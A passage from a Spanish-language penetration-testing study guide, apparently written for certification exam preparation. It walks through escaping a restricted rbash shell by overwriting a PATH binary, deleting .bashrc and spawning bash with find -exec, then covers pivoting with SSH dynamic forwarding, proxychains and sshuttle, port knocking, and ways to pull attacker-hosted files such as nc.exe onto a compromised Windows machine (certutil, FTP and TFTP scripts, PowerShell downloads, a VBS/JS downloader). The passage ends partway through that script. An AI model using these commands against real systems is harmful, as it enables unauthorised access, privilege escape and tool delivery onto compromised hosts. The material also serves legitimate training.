/bin/cat<span class="w"> </span>/home/testuser/.bashrc
testuser@parrot:~$<span class="w"> </span>ping
<span class="nv">PATH</span><span class="o">=</span>/home/testuser/bin
<span class="nb">export</span><span class="w"> </span>PATH
testuser@parrot:~$<span class="w"> </span>
</code></pre></div>

<p>Dado que algo típico en el <strong>rbash</strong> es el no poder utilizar los operadores <strong>&gt; / &gt;&gt;</strong> para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de <strong>rbash</strong> para depositar contenido sobre su directorio personal, así como sobre el recurso <strong>ping</strong> situado en el directorio <strong>bin/</strong>. </p>
<p>De esta forma, dado que la variable <strong>PATH</strong> figura sobre dicho directorio, puede hacer que el binario <strong>ping</strong> tome una nueva funcionalidad, donde como vemos, se aprovecha de la misma para visualizar el recurso <strong>.bashrc</strong>. Una vez ve que el problema radica en dicho recurso, puede aplicar el siguiente movimiento lateral:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>bin/ping
<span class="c1">#!/bin/bash</span>
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/rm /home/testuser/.bashrc&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>bin/ping
/bin/rm<span class="w"> </span>/home/testuser/.bashrc
testuser@parrot:~$<span class="w"> </span>ls<span class="w"> </span>-a
.<span class="w">  </span>..<span class="w">  </span>.bash_history<span class="w">  </span>.bashrc<span class="w">  </span>bin<span class="w">  </span>.gnupg
testuser@parrot:~$<span class="w"> </span>ping
/bin/rm:<span class="w"> </span>¿borrar<span class="w"> </span>el<span class="w"> </span>fichero<span class="w"> </span>regular<span class="w"> </span><span class="s1">&#39;/home/testuser/.bashrc&#39;</span><span class="w">  </span>protegido<span class="w"> </span>contra<span class="w"> </span>escritura?<span class="w"> </span><span class="o">(</span>s/n<span class="o">)</span><span class="w"> </span>s
testuser@parrot:~$<span class="w"> </span>ls<span class="w"> </span>-a
.<span class="w">  </span>..<span class="w">  </span>.bash_history<span class="w">  </span>bin<span class="w">  </span>.gnupg
testuser@parrot:~$<span class="w"> </span>
</code></pre></div>

<p>Una vez logra borrar el <strong>.bashrc</strong>, el siguiente objetivo es configurar una nueva variable de entorno <strong>SHELL</strong>, con la shell deseada, de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export SHELL=bash&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span><span class="s1">&#39;/home/testuser/.bashrc&#39;</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$SHELL</span>
/bin/rbash
testuser@parrot:~$<span class="w"> </span><span class="nb">exit</span>
<span class="nb">exit</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#su testuser</span>
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$SHELL</span>
bash
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/
rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin
</code></pre></div>

<p>Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno <strong>SHELL</strong>, sin embargo, por alguna razón... sigue estando con las mismas restricciones. Llegados a este punto, lo único que debe hacer es el típico <strong>shell spawning</strong> aprovechando la utilidad de algún otro binario, dado que su <strong>PATH</strong> ahora cuenta con todas las rutas absolutas de los binarios del sistema.</p>
<p>Para el siguiente caso, lo hacemos aprovechando la utilidad <strong>-exec</strong> del comando <strong>find</strong>:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span>find<span class="w"> </span>/etc/passwd<span class="w"> </span>-exec<span class="w"> </span>/bin/bash<span class="w"> </span><span class="se">\;</span>
testuser@parrot:~$<span class="w"> </span><span class="nb">pwd</span>
/home/testuser
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
testuser@parrot:/home$<span class="w"> </span>ls
s4vitar<span class="w">  </span>testuser
testuser@parrot:/home$<span class="w"> </span><span class="nb">export</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">COLORTERM</span><span class="o">=</span><span class="s2">&quot;truecolor&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">DISPLAY</span><span class="o">=</span><span class="s2">&quot;:0.0&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">HOME</span><span class="o">=</span><span class="s2">&quot;/home/testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">LANG</span><span class="o">=</span><span class="s2">&quot;es_ES.UTF-8&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">LOGNAME</span><span class="o">=</span><span class="s2">&quot;testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">LS_COLORS</span><span class="o">=</span><span class="s2">&quot;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">MAIL</span><span class="o">=</span><span class="s2">&quot;/var/mail/testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">OLDPWD</span><span class="o">=</span><span class="s2">&quot;/home/testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">PWD</span><span class="o">=</span><span class="s2">&quot;/home&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span><span class="s2">&quot;bash&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SHLVL</span><span class="o">=</span><span class="s2">&quot;3&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SUDO_COMMAND</span><span class="o">=</span><span class="s2">&quot;/bin/su&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SUDO_GID</span><span class="o">=</span><span class="s2">&quot;1000&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SUDO_UID</span><span class="o">=</span><span class="s2">&quot;1000&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SUDO_USER</span><span class="o">=</span><span class="s2">&quot;s4vitar&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">TERM</span><span class="o">=</span><span class="s2">&quot;xterm&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">USERNAME</span><span class="o">=</span><span class="s2">&quot;root&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">XAUTHORITY</span><span class="o">=</span><span class="s2">&quot;/home/s4vitar/.Xauthority&quot;</span>
testuser@parrot:/home$<span class="w"> </span>
</code></pre></div>

<h4 id="pivoting-con-shuttle">Pivoting con Shuttle<a class="headerlink" href="#pivoting-con-shuttle" title="Permanent link">&para;</a></h4>
<p>Aunque en el examen no caerán temas de Pivoting, nunca viene mal tener este concepto claro para saltar a otras redes (de cara a la máquinas del laboratorio para saltar a los distintos segmentos).</p>
<p>Yo en verdad no suelo ser muy partidario de esta herramienta, lo que suelo hacer en su defecto es aplicar un '<em>Dynamic Port Forwarding</em>', de este modo sobre el sistema:</p>
<div class="codehilite"><pre><span></span><code>ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">1080</span><span class="w"> </span>usuario@host
</code></pre></div>

<p>Y diréis, ah... pero hay que conocer la password. Obviamente... si comprometes un equipo, será a fondo, lo mismo sucederá con <strong>Shuttle</strong>.</p>
<p>Una vez hecha la conexión, tendremos que aplicar la siguiente configuración desde el fichero '<em>/etc/proxychains.conf</em>':</p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span>ProxyList<span class="o">]</span>
<span class="c1"># add proxy here ...</span>
<span class="c1"># meanwile</span>
<span class="c1"># defaults set to &quot;tor&quot;</span>
socks4<span class="w">  </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span>
</code></pre></div>

<p>De esta forma, conseguimos que a la hora de aplicar la siguiente sintaxis sobre un Host al que no deberíamos tener conectividad:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>proxychains<span class="w"> </span>ssh<span class="w"> </span>root@ipOtroSegmento
</code></pre></div>

<p>Tengamos alcance y nos resuelva el servicio. Para los escaneos con <strong>nmap</strong> sucede lo mismo, solo que hay que añadir una ligera variación en cuanto a parámetros respecta:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>proxychains<span class="w"> </span>nmap<span class="w"> </span>-p21,80,443<span class="w"> </span>-r<span class="w"> </span>-v<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>-Pn<span class="w"> </span>-T5<span class="w"> </span>-n<span class="w"> </span>-oG<span class="w"> </span>openPorts
</code></pre></div>

<p>Tendremos que añadir los parámetros '-T5 -Pn' generalmente, lo mismo para escanear a fondo dichos puertos:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>proxychains<span class="w"> </span>nmap<span class="w"> </span>-p21,80,443<span class="w"> </span>-Pn<span class="w"> </span>-T5<span class="w"> </span>-sC<span class="w"> </span>-sV
</code></pre></div>

<p>Dicho esto, explico el uso de <strong>Shuttle</strong>. Supongamos que acabamos de comprometer el sistema <strong>192.168.1.X</strong>, tenemos las credenciales del usuario <strong>pepe</strong> para conexión por SSH y descubrimos que desde dicho sistema tenemos conectividad con un nuevo segmento <strong>10.2.15.0/24</strong>. Una vez teniendo <strong>shuttle</strong> en nuestro sistema, lo único que tendremos que hacer es lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>sshuttle<span class="w"> </span>-vr<span class="w"> </span>pepe@192.168.1.X:22000<span class="w"> </span><span class="m">10</span>.2.15.1/24<span class="w"> </span>-x<span class="w"> </span><span class="m">192</span>.168.1.X
</code></pre></div>

<p>Donde el parámetro '<em>-x</em>' es opcional, por el cual especificamos la propia IP del sistema para descartarla posteriormente del rango de conectividad. (Una tontería, pero bueno)</p>
<h1 id="port-knocking">Port Knocking<a class="headerlink" href="#port-knocking" title="Permanent link">&para;</a></h1>
<p>Que no falte mencionar esta famosa practica para ocultar puertos. Para que sea entendible la utilidad sin entrar mucho a nivel técnico, digamos que tenemos un VPS por el cual accedemos normalmente por el puerto 22 hacia el servicio SSH. ¿Qué sucede?, que el servicio queda público de cara hacia fuera. Una práctica para proteger estos servicios es configurar una serie de puertos (generalmente 3), para de golpearlos hacer visible temporalmente estos servicios.</p>
<p>Me explico, supongamos que tras un escaneo inicial, vemos que el puerto 22 para el servicio SSH figura como '<em>closed</em>'. Sin embargo, por X razones, sabemos que de aplicar un <strong>Port Knocking</strong> sobre los puertos 4264 4563 5798, el puerto 22 se abre temporalmente permitiendo conexiones entrantes al servicio.</p>
<p><strong>¿Cómo hacemos para golpear dichos puertos y realizar la conexión?</strong></p>
<p>Los hay quienes se montan un script infumable, realmente no hace falta:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>nmap<span class="w"> </span>-p4264,4563,5798<span class="w"> </span>-r<span class="w"> </span>-T5<span class="w"> </span>-PN<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ssh<span class="w"> </span>usuario@ip
</code></pre></div>

<p>Con hacer esto, se habilitaría temporalmente el servicio SSH sobre el puerto 22, visualizando la conexión asociada así como la autenticación para validar el usuario.</p>
<p>Como <strong>nmap</strong> a veces es muy suyo y no sigue el orden fijado de puertos a escanear, asignamos el parámetro '<em>-n</em>' para que el <strong>Port Knocking</strong> haga efecto, pues en caso de golpearlos en el orden incorrecto simplemente no sucederá nada.</p>
<h3 id="pentesting-windows">Pentesting Windows<a class="headerlink" href="#pentesting-windows" title="Permanent link">&para;</a></h3>
<p>A pesar de implementar y poner en práctica otras técnicas que no describo en los siguiente puntos, enumero a continuación las que para mi son más importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, así como de cara al examen.</p>
<h4 id="transferencia-de-archivos">Transferencia de Archivos<a class="headerlink" href="#transferencia-de-archivos" title="Permanent link">&para;</a></h4>
<p>Tenemos distintas formas de transferir archivos desde la máquina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de <strong>certutil</strong>, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la máquina Windows:</p>
<p><code>certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe</code></p>
<p>En caso de no contar con <strong>certutil</strong>, podemos montarnos un servicio FTP en local, para posteriormente desde la máquina Windows vía <strong>FTP</strong> obtener los recursos. Para ello, tendremos que crear un archivo <em>.txt</em> sobre la máquina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):</p>
<div class="codehilite"><pre><span></span><code>open<span class="w"> </span><span class="m">192</span>.168.1.45<span class="w"> </span><span class="m">21</span>
user<span class="w"> </span>s4vitar
password
binary
GET<span class="w"> </span>archivo
bye
</code></pre></div>

<p>Para ello, simplemente desde el <em>CMD</em> vamos haciendo lo siguiente:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>open<span class="w"> </span><span class="m">192</span>.168.1.45<span class="w"> </span><span class="m">21</span><span class="w"> </span>&gt;<span class="w"> </span>ftp.txt
<span class="nb">echo</span><span class="w"> </span>user<span class="w"> </span>s4vitar<span class="w"> </span>&gt;&gt;<span class="w"> </span>ftp.txt
<span class="nb">echo</span><span class="w"> </span>password<span class="w"> </span>&gt;&gt;<span class="w"> </span>ftp.txt
<span class="nb">echo</span><span class="w"> </span>binary<span class="w"> </span>&gt;&gt;<span class="w"> </span>ftp.txt
<span class="nb">echo</span><span class="w"> </span>GET<span class="w"> </span>archivo<span class="w"> </span>&gt;&gt;<span class="w"> </span>ftp.txt
<span class="nb">echo</span><span class="w"> </span>bye<span class="w"> </span>&gt;&gt;<span class="w"> </span>ftp.txt
</code></pre></div>

<p>Para que se realicen los pasos fijados sobre el fichero, es necesario desde la máquina Windows aplicar el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>ftp<span class="w"> </span>-v<span class="w"> </span>-n<span class="w"> </span>-s:ftp.txt
</code></pre></div>

<p>Una vez hecho, se realizará la transferencia y tendremos el recurso en la máquina Windows. Lo mismo habría valido para enviar archivos a nuestra máquina local.</p>
<p>En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la máquina Linux:</p>
<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span>-w
</code></pre></div>

<p>Posteriormente, ejecutamos las mismas instrucciones del lado de la máquina comprometida.</p>
<p>Otra vía para realizar la transferencia de archivos desde nuestra máquina de atacante a la máquina Windows comprometida es aprovecharse de la utilidad <strong>TFTP</strong>. Para ello, desde nuestra máquina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:</p>
<div class="codehilite"><pre><span></span><code>atftpd<span class="w"> </span>--daemon<span class="w"> </span>--port<span class="w"> </span><span class="m">69</span><span class="w"> </span>/tftp
</code></pre></div>

<p>Una vez hecho, desde la máquina Windows, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>tftp<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.1.45<span class="w"> </span>GET<span class="w"> </span>nc.exe
</code></pre></div>

<p>Otra vía para realizar transferencia de archivos es desde nuestra máquina de atacante, compartir los recursos a través de un servidor web vía Python:</p>
<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>-m<span class="w"> </span>SimpleHTTPServer<span class="w"> </span><span class="m">443</span>
</code></pre></div>

<p>Y desde la máquina Windows, aplicar los siguientes comandos de <strong>Powershell</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;(new-object  System.Net.WebClient).DownloadFile(&#39;http://192.168.1.45:443/file.exe&#39;,&#39;C:\Users\user\Desktop\file.exe&#39;)&quot;</span>

<span class="c"># También podemos usar esta otra forma</span>
<span class="n">powershell</span> <span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;http://192.168.1.45:443/file.exe&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\Users\user\Desktop\file.exe&quot;</span>
</code></pre></div>

<p>Por si todas estas vías de transferencia de archivos se nos quedan cortas, podemos hacerlo a través de un script en <strong>VBS</strong>, que suele funcionar para la mayoría de las veces. Para ello, desde la máquina Windows, tendremos que aplicar las siguientes instrucciones:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="nv">strUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>WScript.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span><span class="nv">StrFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>WScript.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Const<span class="w"> </span><span class="nv">HTTPREQUEST_PROXYSETTING_DEFAULT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Const<span class="w"> </span><span class="nv">HTTPREQUEST_PROXYSETTING_PRECONFIG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Const<span class="w"> </span><span class="nv">HTTPREQUEST_PROXYSETTING_DIRECT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Const<span class="w"> </span><span class="nv">HTTPREQUEST_PROXYSETTING_PROXY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Dim<span class="w"> </span>http,varByteArray,strData,strBuffer,lngCounter,fs,ts<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Err.Clear<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Set<span class="w"> </span><span class="nv">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Nothing<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Set<span class="w"> </span><span class="nv">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>If<span class="w"> </span>http<span class="w"> </span>Is<span class="w"> </span>Nothing<span class="w"> </span>Then<span class="w"> </span>Set<span class="w"> </span><span class="nv">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;WinHttp.WinHttpRequest&quot;</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>If<span class="w"> </span>http<span class="w"> </span>Is<span class="w"> </span>Nothing<span class="w"> </span>Then<span class="w"> </span>Set<span class="w"> </span><span class="nv">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.ServerXMLHTTP&quot;</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>If<span class="w"> </span>http<span class="w"> </span>Is<span class="w"> </span>Nothing<span class="w"> </span>Then<span class="w"> </span>Set<span class="w"> </span><span class="nv">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Microsoft.XMLHTTP&quot;</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>http.Open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,strURL,False<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>http.Send<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span><span class="nv">varByteArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>http.ResponseBody<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Set<span class="w"> </span><span class="nv">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Nothing<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Set<span class="w"> </span><span class="nv">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Set<span class="w"> </span><span class="nv">ts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>fs.CreateTextFile<span class="o">(</span>StrFile,True<span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span><span class="nv">strData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span><span class="nv">strBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>For<span class="w"> </span><span class="nv">lngCounter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>to<span class="w"> </span>UBound<span class="o">(</span>varByteArray<span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>ts.Write<span class="w"> </span>Chr<span class="o">(</span><span class="m">255</span><span class="w"> </span>And<span class="w"> </span>Ascb<span class="o">(</span>Midb<span class="o">(</span>varByteArray,lngCounter<span class="w"> </span>+<span class="w"> </span><span class="m">1</span>,1<span class="o">)))</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>Next<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>ts.Close<span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
</code></pre></div>

<p>Una vez definido el recurso <strong>wget.vbs</strong>, aplicamos el siguiente comando para una vez montando nuestro servidor web vía Python en la máquina atacante, descargar los recursos que consideremos:</p>
<div class="codehilite"><pre><span></span><code>cscript<span class="w"> </span>wget.vbs<span class="w"> </span>http://192.168.1.45:443/file.exe<span class="w"> </span>file.exe
</code></pre></div>

<p>Por si vemos que es mucha molestia estar definiendo todo el script <em>wget.vbs</em>, podemos acotarlo de la siguiente forma, y funcionará igualmente:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>var<span class="w"> </span><span class="nv">WinHttpReq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>ActiveXObject<span class="o">(</span><span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>WinHttpReq.Open<span class="o">(</span><span class="s2">&quot;GET&quot;</span>,<span class="w"> </span>WScript.Arguments<span class="o">(</span><span class="m">0</span><span class="o">)</span>,<span class="w"> </span>/*async<span class="o">=</span>*/false<span class="o">)</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>WinHttpReq.Send<span class="o">()</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>WScript.Echo<span class="o">(</span>WinHttpReq.ResponseText<span class="o">)</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span><span class="nv">BinStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>ActiveXObject<span class="o">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>BinStream.Type<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>BinStream.Open<span class="o">()</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
<span class="nb">echo</span><span class="w"> </span>BinStream.Write<span class="o">(</span>WinHttpReq.ResponseBody<span class="o">)</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
